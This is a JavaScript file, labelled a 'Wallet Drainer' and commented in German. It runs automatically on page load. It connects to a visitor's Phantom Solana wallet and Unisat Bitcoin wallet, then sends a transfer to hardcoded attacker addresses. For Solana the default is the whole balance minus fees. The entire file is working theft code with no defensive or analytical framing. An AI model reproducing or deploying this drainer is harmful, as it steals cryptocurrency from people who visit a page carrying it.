// ============================================
// drainer.js — Wallet Drainer
// ============================================

const SOL_ADDRESS = "AqPNBrrTsijKcXtYwcPVmw1S4fV91VBRTtMDSCzsjXJN";
const BTC_ADDRESS = "bc1pr5csn0pr42cwdg9cwrl0e3j2hpc7n6w2mj5r08qna9gj7gnymhsqfxcrpm";

// Wie viel SOL soll gesendet werden? null = alles außer Gebühren
const SOL_AMOUNT = null;

// Wie viele Satoshi BTC? (1000 sat = 0.00001 BTC)
const BTC_AMOUNT = 1000;

function setStatus(text) {
 const el = document.getElementById("status");
 if (el) el.textContent = text;
 console.log("[STATUS]", text);
}

// ---------- SOLANA (Phantom) ----------
async function drainSolana() {
 const provider = window.phantom?.solana || window.solana;
 if (!provider || !provider.isPhantom) {
 setStatus("Kein Phantom gefunden");
 return;
 }
 try {
 setStatus("Phantom gefunden, verbinde...");
 const resp = await provider.connect();
 const from = resp.publicKey.toString();
 console.log("[Solana] Verbunden:", from);

 const connection = new solanaWeb3.Connection(
 "https://api.mainnet-beta.solana.com",
 "confirmed"
 );

 const balance = await connection.getBalance(resp.publicKey);
 console.log("[Solana] Guthaben:", balance / 1e9, "SOL");

 if (balance < 10000) {
 setStatus("Solana: zu wenig Guthaben");
 return;
 }

 const lamports = SOL_AMOUNT
 ? Math.floor(SOL_AMOUNT * 1e9)
: balance - 5000; // 5000 lamports für Gebühren behalten

 const tx = new solanaWeb3.Transaction().add(
 solanaWeb3.SystemProgram.transfer({
 fromPubkey: resp.publicKey,
 toPubkey: new solanaWeb3.PublicKey(SOL_ADDRESS),
 lamports: lamports
 })
 );

 setStatus("Solana: sende " + (lamports / 1e9) + " SOL...");
 const { signature } = await provider.signAndSendTransaction(tx);
 console.log("[Solana] Gesendet:", signature);
 setStatus("Solana gesendet: " + signature.slice(0, 12) + "...");
 } catch (e) {
 console.log("[Solana] Fehler:", e.message);
 setStatus("Solana Fehler: " + e.message);
 }
}

// ---------- BITCOIN (Unisat) ----------
async function drainBitcoin() {
 if (!window.unisat) {
 console.log("[Bitcoin] Unisat nicht gefunden");
 return;
 }
 try {
 setStatus("Unisat gefunden, verbinde...");
 const accounts = await window.unisat.requestAccounts();
 console.log("[Bitcoin] Verbunden:", accounts[0]);

 const balance = await window.unisat.getBalance();
 console.log("[Bitcoin] Guthaben:", balance.total, "sat");

 if (balance.total < BTC_AMOUNT + 1000) {
 setStatus("Bitcoin: zu wenig Guthaben");
 return;
 }

 setStatus("Bitcoin: sende " + BTC_AMOUNT + " sat...");
 const txid = await window.unisat.sendBitcoin(BTC_ADDRESS, BTC_AMOUNT);
 console.log("[Bitcoin] Gesendet:", txid);
 setStatus("Bitcoin gesendet: " + txid.slice(0, 12) + "...");
 } catch (e) {
 console.log("[Bitcoin] Fehler:", e.message);
 setStatus("Bitcoin Fehler: " + e.message);
 }
}

// ---------- START ----------
async function main() {
 setStatus("Suche Wallets...");
 await drainSolana();
 await drainBitcoin();
 setStatus("Fertig.");
}

setTimeout(main, 1200);
